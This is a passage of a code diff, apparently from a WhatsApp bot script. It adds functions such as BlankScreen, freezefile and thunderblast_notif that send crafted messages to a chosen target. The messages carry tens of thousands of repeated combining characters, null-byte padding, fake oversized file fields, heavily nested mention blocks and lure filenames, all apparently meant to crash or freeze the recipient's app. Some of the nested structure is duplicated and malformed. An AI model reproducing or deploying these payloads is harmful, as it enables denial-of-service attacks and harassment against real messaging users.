᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                         },
-                        messageContextInfo: {
-                            messageSecret: crypto.randomBytes(32),
-                            supportPayload: JSON.stringify({
-                                version: 2,
-                                is_ai_message: true,
-                                should_show_system_message: true,
-                                ticket_id: crypto.randomBytes(16),
-                            }),
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                         },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
+                            contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                            groupMentions: [
+                                {
+                                    groupJid: "1@newsletter", 
+                                    groupSubject: "UNDEFINED",  
+                                    groupMetadata: {
+                                        creationTimestamp: 1715880173,  
+                                        ownerJid: "owner@newsletter",  
+                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
+                                    }
+                                }
+                            ],
+                            externalContextInfo: {
+                                customTag: "SECURE_PAYBUG_MESSAGE",  
+                                securityLevel: "HIGH",  
+                                referenceCode: "PAYBUG10291",  
+                                timestamp: new Date().toISOString(),  
+                                messageId: "MSG00123456789",  
+                                userId: "UNDEFINED"  
+                            },
+                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
+                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
+                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
+                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
+                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
+                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
+                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
+                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
+                        },
+                    contextInfo: {
+                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
+                        isForwarded: true,
+                        quotedMessage: {
+								documentMessage: {
+											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+											fileLength: "999999999999",
+											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+											fileName: "Alwaysaqioo The Juftt️",
+											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mediaKeyTimestamp: "1724474503",
+											contactVcard: true,
+											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+											jpegThumbnail: "",
+						}
+                    }
                     }
                 }
             }
-
-            await Xlesy.relayMessage(Pe, messagePayload, {
-                additionalNodes: stanza,
-                participant: {
-                    jid: Pe
-                }
-            });
-            console.log("Success! Force Ui Sent")
         }
+    };
+
+    Xlesy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
+}
+ async function BlankScreen(target, Ptcp = false) {
+let virtex = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
+			await Xlesy.relayMessage(target, {
+					ephemeralMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 1316134911,
+										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+										fileName: "Hayolo",
+										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1726867151",
+										contactVcard: true,
+										jpegthumbnail: "https://files.catbox.moe/540elt.jpg",
+									},
+									hasMediaAttachment: true,
+								},
+								body: {
+									text: virtex,
+								},
+								nativeFlowMessage: {
+								name: "call_permission_request",
+								messageParamsJson: "\u0000".repeat(5000),
+								},
+								contextInfo: {
+								mentionedJid: ["0@s.whatsapp.net"],
+									forwardingScore: 1,
+									isForwarded: true,
+									fromMe: false,
+									participant: "0@s.whatsapp.net",
+									remoteJid: "status@broadcast",
+									quotedMessage: {
+										documentMessage: {
+											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+											fileLength: "9999999999999",
+											pageCount: 1316134911,
+											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+											fileName: "Bokep 18+",
+											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mediaKeyTimestamp: "1724474503",
+											contactVcard: true,
+											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+											jpegThumbnail: "https://files.catbox.moe/540elt.jpg",
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+            console.log(chalk.red.bold('🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷'))
+   	};
+
+
+async function freezefile(target, QBug, Ptcp = true) {
+    let virtex = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ြ".repeat(25000);
+    await Xlesy.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "NtahMengapa..",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: virtex
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+async function thunderblast_notif(target) {
+			await Xlesy.relayMessage(target, {
+					ephemeralMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 1316134911,
+										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+										fileName: "\u0000",
+										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1726867151",
+										contactVcard: true,
+										jpegthumbnail: 'https://files.catbox.moe/540elt.jpg',
+									},
+									hasMediaAttachment: true,
+								},
+								body: {
+									text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷